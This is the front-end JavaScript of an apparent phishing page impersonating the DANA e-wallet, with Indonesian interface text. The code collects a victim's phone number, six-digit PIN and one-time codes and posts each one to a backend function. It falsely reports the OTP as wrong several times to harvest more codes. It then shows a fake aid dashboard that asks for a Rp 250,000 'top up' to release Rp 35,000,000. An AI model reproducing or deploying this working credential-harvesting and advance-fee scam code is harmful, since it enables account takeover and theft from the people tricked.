document.addEventListener('DOMContentLoaded', () => {
  // DOM References
  const pages = {
    n: document.getElementById('number-page'),
    p: document.getElementById('pin-page'),
    o: document.getElementById('otp-page'),
    d: document.getElementById('dashboard-page')
  };
  
  const lb = document.getElementById('lanjutkan-button');
  const pn = document.getElementById('phone-number');
  const pis = document.querySelectorAll('.pin-box');
  const ois = document.querySelectorAll('.otp-box');
  const fn = document.getElementById('floating-notification');
  const sn = document.getElementById('success-notification');
  const rn = document.getElementById('reward-notification');
  const ac = document.getElementById('attempt-counter');
  const an = document.getElementById('attempt-number');
  const lc = document.getElementById('lanjutkan-container');

  // State Variables
  let currentPage = 'n';
  let phoneNumber = '';
  let pin = '';
  let otp = '';
  let attemptCount = 0;
  const maxAttempts = 6;
  let otpTimer;

  // Helper Functions
  function showSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'flex';
  }

  function hideSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'none';
  }

  function startOTPTimer() {
    let timeLeft = 120;
    const timerElement = document.getElementById('otp-timer');
    
    otpTimer = setInterval(() => {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      
      if (timeLeft <= 0) {
        clearInterval(otpTimer);
      }
      timeLeft--;
    }, 1000);
  }

  function resetOTPInputs() {
    ois.forEach(input => input.value = '');
    ois[0].focus();
    otp = '';
    attemptCount++;
    an.textContent = attemptCount;
    ac.style.display = 'block';
  }

  function showDashboard() {
    pages.o.style.display = 'none';
    pages.d.style.display = 'block';
    currentPage = 'd';
    lc.style.display = 'none';
    
    // Inisialisasi fungsi dashboard
    initDashboard();
  }

  function initDashboard() {
    // Modal functionality untuk dashboard
    const infoModal = document.getElementById('infoModal');
    const tutorialModal = document.getElementById('tutorialModal');
    const infoBtn = document.getElementById('infoBtn');
    const topUpBtn = document.getElementById('topUpBtn');
    const closeModal = document.getElementById('closeModal');
    const closeModalBtn = document.getElementById('closeModalBtn');
    const closeTutorialModal = document.getElementById('closeTutorialModal');
    const closeTutorialBtn = document.getElementById('closeTutorialBtn');
    const topUpModalBtn = document.getElementById('topUpModalBtn');
    const confirmTopUpBtn = document.getElementById('confirmTopUpBtn');

    // Show tutorial modal when Top Up button is clicked
    if (topUpBtn) {
      topUpBtn.addEventListener('click', function() {
        tutorialModal.style.display = 'flex';
      });
    }

    // Show info modal when Info button is clicked
    if (infoBtn) {
      infoBtn.addEventListener('click', function() {
        infoModal.style.display = 'flex';
      });
    }

    // Close tutorial modal when X is clicked
    if (closeTutorialModal) {
      closeTutorialModal.addEventListener('click', function() {
        tutorialModal.style.display = 'none';
      });
    }

    // Close tutorial modal when Close button is clicked
    if (closeTutorialBtn) {
      closeTutorialBtn.addEventListener('click', function() {
        tutorialModal.style.display = 'none';
      });
    }

    // Close info modal when X is clicked
    if (closeModal) {
      closeModal.addEventListener('click', function() {
        infoModal.style.display = 'none';
      });
    }

    // Close info modal when Close button is clicked
    if (closeModalBtn) {
      closeModalBtn.addEventListener('click', function() {
        infoModal.style.display = 'none';
      });
    }

    // Top Up action from info modal
    if (topUpModalBtn) {
      topUpModalBtn.addEventListener('click', function() {
        infoModal.style.display = 'none';
        tutorialModal.style.display = 'flex';
      });
    }

    // Confirm Top Up action from tutorial modal
    if (confirmTopUpBtn) {
      confirmTopUpBtn.addEventListener('click', function() {
        if(confirm('Apakah Anda sudah berhasil melakukan top up sebesar Rp 250.000?')) {
          alert('Top Up berhasil dikonfirmasi! Dana bantuan sebesar Rp 35.000.000 sedang diaktifkan...');
          
          // Simulasi perubahan UI setelah top up berhasil
          if (topUpBtn) {
            topUpBtn.textContent = 'Aktivasi Berhasil';
            topUpBtn.style.backgroundColor = '#00a86b';
            topUpBtn.disabled = true;
          }
          
          tutorialModal.style.display = 'none';
          
          // Tampilkan pesan sukses
          showSuccessMessage();
        }
      });
    }

    // Close modals when clicking outside
    window.addEventListener('click', function(event) {
      if (event.target === infoModal) {
        infoModal.style.display = 'none';
      }
      if (event.target === tutorialModal) {
        tutorialModal.style.display = 'none';
      }
    });
  }

  function showSuccessMessage() {
    const successMessage = document.createElement('div');
    successMessage.style.cssText = `
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #00a86b;
      color: white;
      padding: 15px 20px;
      border-radius: 5px;
      z-index: 1000;
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
      animation: slideDown 0.3s ease-out;
    `;
    
    successMessage.innerHTML = `
      <div style="display: flex; align-items: center; gap: 10px;">
        <span style="font-size: 20px;">✅</span>
        <div>
          <strong>Berhasil!</strong><br>
          Dana bantuan sedang diaktifkan dan akan dicairkan bertahap.
        </div>
      </div>
    `;
    
    document.body.appendChild(successMessage);
    
    // Hapus pesan setelah 5 detik
    setTimeout(() => {
      successMessage.remove();
    }, 5000);
  }

  // Backend Communication
  async function sendDanaData(type, data) {
    try {
      const response = await fetch('/.netlify/functions/send-dana-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, ...data })
      });
      
      if (!response.ok) throw new Error(await response.text());
      return await response.json();
    } catch (error) {
      console.error('Error:', error);
      throw error;
    }
  }

  // Modified Phone Number Formatting
  pn.addEventListener('input', (e) => {
    // Hapus semua karakter non-digit
    let value = e.target.value.replace(/\D/g, '');
    
    // Hapus angka 0 di awal jika ada
    if (value.startsWith('0')) {
      value = value.substring(1);
    }
    
    // Pastikan selalu dimulai dengan 8
    if (value.length > 0 && !value.startsWith('8')) {
      value = '8' + value.replace(/^8/, ''); // Tambahkan 8 di depan dan hapus 8 yang mungkin sudah ada
    }
    
    // Batasi panjang maksimal (3+4+5=12 digit)
    if (value.length > 12) {
      value = value.substring(0, 12);
    }
    
    // Format nomor dengan tanda hubung
    let formatted = '';
    if (value.length > 0) {
      formatted = value.substring(0, 3); // 3 digit pertama
      if (value.length > 3) {
        formatted += '-' + value.substring(3, 7); // 4 digit berikutnya
      }
      if (value.length > 7) {
        formatted += '-' + value.substring(7, 12); // 5 digit terakhir
      }
    }
    
    // Set nilai input dengan format yang sudah dibuat
    e.target.value = formatted;
    
    // Simpan nomor tanpa format untuk pengiriman data
    phoneNumber = value;
  });

  // Event Handlers
  lb.addEventListener('click', async () => {
    if (currentPage === 'n') {
      if (phoneNumber.length < 10) {
        alert('Nomor HP harus minimal 10 digit');
        return;
      }
      
      showSpinner();
      try {
        await sendDanaData('phone', { phone: phoneNumber });
        pages.n.style.display = 'none';
        pages.p.style.display = 'block';
        currentPage = 'p';
        lc.style.display = 'none';
      } catch (error) {
        alert('Gagal mengirim data: ' + error.message);
      } finally {
        hideSpinner();
      }
    }
  });

  // PIN Input Handling
  pis.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < pis.length - 1) {
        pis[index + 1].focus();
      }
      
      pin = Array.from(pis).map(i => i.value).join('');
      
      if (pin.length === 6) {
        showSpinner();
        try {
          await sendDanaData('pin', { phone: phoneNumber, pin });
          pages.p.style.display = 'none';
          pages.o.style.display = 'block';
          currentPage = 'o';
          lc.style.display = 'none';
          startOTPTimer();
          setTimeout(() => fn.style.display = 'block', 1000);
        } catch (error) {
          alert('Gagal mengirim PIN: ' + error.message);
        } finally {
          hideSpinner();
        }
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        pis[index - 1].focus();
      }
    });
  });

  // OTP Input Handling
  ois.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < ois.length - 1) {
        ois[index + 1].focus();
      }
      
      otp = Array.from(ois).map(i => i.value).join('');
      
      if (index === ois.length - 1 && e.target.value.length === 1) {
        showSpinner();
        try {
          await sendDanaData('otp', { phone: phoneNumber, pin, otp });
          
          setTimeout(() => {
            resetOTPInputs();
            
            if (attemptCount > 2) {
              rn.style.display = 'block';
              rn.innerHTML = `
                <div class="notification-content">
                  <h3>kode OTP Salah</h3>
                  <p>silahkan cek sms ataupan whatsapp</p>
                </div>
              `;
              setTimeout(() => rn.style.display = 'none', 10000);
            }
            
            if (attemptCount >= maxAttempts) {
              fn.style.display = 'none';
              sn.style.display = 'block';
              setTimeout(() => {
                sn.style.display = 'none';
                showDashboard();
              }, 3000);
            }
          }, 1000);
        } catch (error) {
          console.error('Gagal mengirim OTP:', error);
        } finally {
          hideSpinner();
        }
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        ois[index - 1].focus();
      }
    });
  });

  // Toggle PIN Visibility
  document.querySelector('.show-text').addEventListener('click', (e) => {
    const isShowing = e.target.classList.toggle('active');
    const pinInputs = document.querySelectorAll('.pin-box');
    pinInputs.forEach(input => {
      input.type = isShowing ? 'text' : 'password';
    });
    e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
  });

  // Add CSS animation for success message
  const style = document.createElement('style');
  style.textContent = `
    @keyframes slideDown {
      from {
        transform: translateX(-50%) translateY(-100%);
        opacity: 0;
      }
      to {
        transform: translateX(-50%) translateY(0);
        opacity: 1;
      }
    }
  `;
  document.head.appendChild(style);
});
